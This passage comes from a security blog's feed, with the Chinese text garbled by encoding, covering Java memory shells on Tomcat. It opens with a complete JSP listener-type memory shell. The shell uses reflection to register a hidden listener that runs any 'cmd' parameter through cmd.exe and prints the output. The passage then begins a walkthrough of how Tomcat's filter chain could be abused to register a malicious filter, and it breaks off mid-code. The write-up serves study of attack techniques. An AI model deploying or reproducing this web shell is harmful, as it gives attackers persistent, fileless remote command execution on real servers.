class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; sreClass = sre.getClass();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestFacadeField</span> <span class="operator">=</span> sreClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestFacadeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) requestFacadeField.get(sre);</span><br><span class="line">                Class&lt;?&gt; requestFacadeClass = requestFacade.getClass();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> requestFacadeClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">                Class&lt;?&gt; requestClass = request.getClass();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">responseField</span> <span class="operator">=</span> requestClass.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                responseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) responseField.get(request);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    ProcessBuilder processBuilder;</span><br><span class="line">                    processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                        String line;</span><br><span class="line">                        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                            output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                    response.getWriter().println(output);</span><br><span class="line">                &#125;</span><br><span class="line">                ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line"></span><br><span class="line">        trueStandardContext.addApplicationEventListener(<span class="keyword">new</span> <span class="title class_">Listener</span>());</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•å¯ä»¥å‘ç°å‘½ä»¤ç»“æœç›´æ¥æ‰“å°åœ¨äº†ç°æœ‰é¡µé¢ä¸Š</p><p><img src="/img/post/image-20260106180605743.png" alt="image-20260106180605743"></p><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Filterå†…å­˜é©¬ç®€æ</title>
      <link href="/2026/01/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E6%9E%90/"/>
      <url>/2026/01/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Filterå†…å­˜é©¬"><a href="#Filterå†…å­˜é©¬" class="headerlink" title="Filterå†…å­˜é©¬"></a>Filterå†…å­˜é©¬</h1><p>Filterå†…å­˜é©¬é€šè¿‡å‘æœåŠ¡å™¨åç«¯æ³¨å†Œæ¶æ„çš„è¿‡æ»¤å™¨ä»¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><h2 id="Filterè¿‡æ»¤å™¨"><a href="#Filterè¿‡æ»¤å™¨" class="headerlink" title="Filterè¿‡æ»¤å™¨"></a>Filterè¿‡æ»¤å™¨</h2><p>æ­£å¸¸æƒ…å†µä¸‹å¯ä»¥é€šè¿‡ç»§æ‰¿<code>HttpFilter</code>ç±»å¹¶é‡å†™çˆ¶ç±»çš„<code>doFilter()</code>æ–¹æ³•å¹¶é€šè¿‡<code>web.xml</code>æ–‡ä»¶é…ç½®å®ç°ä¸€ä¸ªè¿‡æ»¤å™¨</p><p>ç¼–å†™ä¸€ä¸ªè¿‡æ»¤å™¨ï¼ŒåŠŸèƒ½æ˜¯åœ¨è¯†åˆ«å…·æœ‰<code>cmd</code>å‚æ•°æ—¶å‘é¡µé¢æ‰“å°å‚æ•°å†…å®¹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            res.setContentType(<span class="string">&quot;text/html; charset=utf-8&quot;</span>);</span><br><span class="line">            res.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            res.getWriter().println(<span class="string">&quot;cmd=&quot;</span>+cmd);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">super</span>.doFilter(req, res, chain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®<code>web.xml</code>ï¼Œæ³¨å†Œè¿‡æ»¤å™¨ï¼Œåœ¨ä»»æ„è·¯å¾„è¿›è¡Œæ‹¦æˆª</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cmdFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.example.filter.CmdFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cmdFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨TomcatæœåŠ¡å™¨ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹</p><p><img src="/img/post/mem1.png" alt="mem1"></p><h2 id="é€†å‘Filteræ³¨å†Œ"><a href="#é€†å‘Filteræ³¨å†Œ" class="headerlink" title="é€†å‘Filteræ³¨å†Œ"></a>é€†å‘Filteræ³¨å†Œ</h2><p>æ­£å¸¸æƒ…å†µä¸‹æƒ³è¦åˆ›å»ºä¸€ä¸ªæ–°è¿‡æ»¤å™¨ï¼Œéœ€è¦åœ¨åç«¯ç¼–å†™è¿‡æ»¤å™¨æºç ã€æ›´æ–°é…ç½®æ–‡ä»¶ã€é‡å¯æœåŠ¡å™¨ç­‰æ“ä½œã€‚ç„¶è€Œåœ¨æ”»å‡»è§’åº¦ä¸Šçœ‹ï¼Œæˆ‘ä»¬ä¸å¯èƒ½é€šè¿‡ä¿®æ”¹åç«¯æºç çš„æ–¹å¼å»æ³¨å†Œä¸€ä¸ªæ¶æ„Filterã€‚æ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å°†ä¸€ä¸ªjspæ–‡ä»¶ä¸Šä¼ è‡³åç«¯ï¼Œé€šè¿‡è®¿é—®è¯¥jspæ–‡ä»¶æ‰§è¡Œåç«¯ä»£ç æ³¨å†ŒFilter</p><p>æ¥ä¸‹æ¥éœ€è¦çŸ¥é“å¦‚ä½•åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€æ³¨å†ŒFilter</p><p>æ­¥å…¥çˆ¶ç±»<code>HttpFilter</code>çš„<code>doFilter()</code>æ–¹æ³•ï¼Œå‘ç°ä»publicä¿®é¥°çš„<code>doFilter()</code>è·³åˆ°äº†protectedä¿®é¥°çš„<code>doFilter()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(req <span class="keyword">instanceof</span> HttpServletRequest &amp;&amp; res <span class="keyword">instanceof</span> HttpServletResponse)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;non-HTTP request or response&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.doFilter((HttpServletRequest) req, (HttpServletResponse) res, chain);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>protectedä¿®é¥°çš„<code>doFilter()</code>è°ƒç”¨äº†chainçš„<code>doFilter()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(HttpServletRequest req, HttpServletResponse res, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        chain.doFilter(req, res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>chain</code>æ˜¯ä¸€ä¸ª<code>ApplicationFilterChian</code>å®ä¾‹ï¼Œå…¶<code>filters</code>å­—æ®µæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¿å­˜ç€æ³¨å†Œçš„Filter</p><p><img src="/img/post/mem2.png" alt="mem2"></p><p>åœ¨<code>ApplicationFilterChian</code>ç±»çš„<code>doFilter()</code>æ–¹æ³•ä¸­ï¼Œæœ€åéƒ½ä¼šæ‰§è¡Œ<code>internalDoFilter()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                AccessController.doPrivileged(() -&gt; &#123;</span><br><span class="line">                    <span class="built_in">this</span>.internalDoFilter(req, res);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (PrivilegedActionException pe) &#123;</span><br><span class="line">                <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> pe.getException();</span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ServletException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (ServletException)e;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (IOException)e;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (RuntimeException)e;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e.getMessage(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.internalDoFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>internalDoFilter()</code>æ–¹æ³•ä¸­ï¼Œå¯ä»¥ä¸€çª¥Filterçš„å·¥ä½œæœºåˆ¶ã€‚è¯¥æ–¹æ³•ä»æ•°ç»„ä¸­æ¯è·å–ä¸€ä¸ªFilteråï¼ŒæŒ‡é’ˆå°±ä¼šé¡ºç§»åˆ°ä¸‹ä¸€ä¸ªFilterï¼Œåœ¨<code>internalDoFilter()</code>å†…éƒ¨åˆä¼šæ‰§è¡Œå½“å‰å–å‡ºFilterçš„<code>doFIlter()</code>ï¼Œæ¯æ¬¡æ‰§è¡Œå®Œ<code>doFIlter()</code>ååˆä¼šå›åˆ°è¯¥æ–¹æ³•ï¼Œè€Œè¿™æ—¶æ•°ç»„çš„æŒ‡é’ˆå·²ç»æŒ‡å‘ä¸‹ä¸€ä¸ªFilteräº†ï¼Œç›´è‡³æ‰€æœ‰Filterå®Œæˆæ‹¦æˆª</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.pos &lt; <span class="built_in">this</span>.n) &#123;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="built_in">this</span>.filters[<span class="built_in">this</span>.pos++];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter();</span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !filterConfig.getFilterDef().getAsyncSupportedBoolean()) &#123;</span><br><span class="line">                    request.setAttribute(<span class="string">&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;</span>, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span> ((HttpServletRequest)request).getUserPrincipal();</span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response, <span class="built_in">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege(<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException | RuntimeException | IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">filter</span> <span class="operator">=</span> ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                ExceptionUtils.handleThrowable(filter);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.filter&quot;</span>), filter);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.dispatcherWrapsSameObject) &#123;</span><br><span class="line">                    lastServicedRequest.set(request);</span><br><span class="line">                    lastServicedResponse.set(response);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !<span class="built_in">this</span>.servletSupportsAsync) &#123;</span><br><span class="line">                    request.setAttribute(<span class="string">&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;</span>, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (request <span class="keyword">instanceof</span> HttpServletRequest &amp;&amp; response <span class="keyword">instanceof</span> HttpServletResponse &amp;&amp; Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span> ((HttpServletRequest)request).getUserPrincipal();</span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege(<span class="string">&quot;service&quot;</span>, <span class="built_in">this</span>.servlet, classTypeUsedInService, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.servlet.service(request, response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException | RuntimeException | IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">filterConfig</span> <span class="operator">=</span> ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                ExceptionUtils.handleThrowable(filterConfig);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.servlet&quot;</span>), filterConfig);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.dispatcherWrapsSameObject) &#123;</span><br><span class="line">                    lastServicedRequest.set((Object)<span class="literal">null</span>);</span><br><span class="line">                    lastServicedResponse.set((Object)<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥å‘ç°ï¼Œ<code>filters</code>æ˜¯ä¸€ä¸ª<code>ApplicationFilterConfig</code>æ•°ç»„è€Œä¸æ˜¯<code>Filter</code>æ•°ç»„ï¼Œè¦å¯¹å–å‡ºçš„<code>ApplicationFilterConfig</code>è°ƒç”¨<code>getFilter()</code>æ–¹æ³•æ‰èƒ½è·å–<code>Filter</code>å®ä¾‹ã€‚å½“å‰çš„ç›®æ ‡æ˜¯å¾—çŸ¥<code>filters</code>åœ¨ä½•æ—¶è¢«èµ‹å€¼ï¼Œå› ä¸ºè¯¥å­—æ®µçš„å£°æ˜ä¸­ä¸€å¼€å§‹æ˜¯ä¸€ä¸ªç©ºæ•°ç»„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>å‘ç°<code>ApplicationFilterChain</code>çš„<code>addFilter()</code>æ–¹æ³•å®ç°äº†å¯¹è¯¥å­—æ®µçš„èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.filters[i] == filterConfig) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.n == <span class="built_in">this</span>.filters.length) &#123;</span><br><span class="line">            <span class="built_in">this</span>.filters = (ApplicationFilterConfig[])Arrays.copyOf(<span class="built_in">this</span>.filters, <span class="built_in">this</span>.n + <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.filters[<span class="built_in">this</span>.n++] = filterConfig;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾è°ƒç”¨äº†è¯¥æ–¹æ³•çš„ç±»ï¼Œåœ¨<code>ApplicationFilterFactory</code>ç±»çš„<code>creatFilterChain()</code>ä¸­è°ƒç”¨äº†è¯¥æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request, Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ApplicationFilterChain filterChain;</span><br><span class="line">            <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">                <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request)request;</span><br><span class="line">                <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filterChain = (ApplicationFilterChain)req.getFilterChain();</span><br><span class="line">                    <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                        req.setFilterChain(filterChain);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            filterChain.setServlet(servlet);</span><br><span class="line">            filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext)wrapper.getParent();</span><br><span class="line">            filterChain.setDispatcherWrapsSameObject(context.getDispatcherWrapsSameObject());</span><br><span class="line">            FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line">            <span class="keyword">if</span> (filterMaps != <span class="literal">null</span> &amp;&amp; filterMaps.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span> (DispatcherType)request.getAttribute(<span class="string">&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> FilterUtil.getRequestPath(request);</span><br><span class="line">                <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; FilterUtil.matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                        <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                            log.warn(sm.getString(<span class="string">&quot;applicationFilterFactory.noFilterConfig&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterMap.getFilterName()&#125;));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            filterChain.addFilter(filterConfig);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">                        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                        <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                            log.warn(sm.getString(<span class="string">&quot;applicationFilterFactory.noFilterConfig&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterMap.getFilterName()&#125;));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            filterChain.addFilter(filterConfig);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span 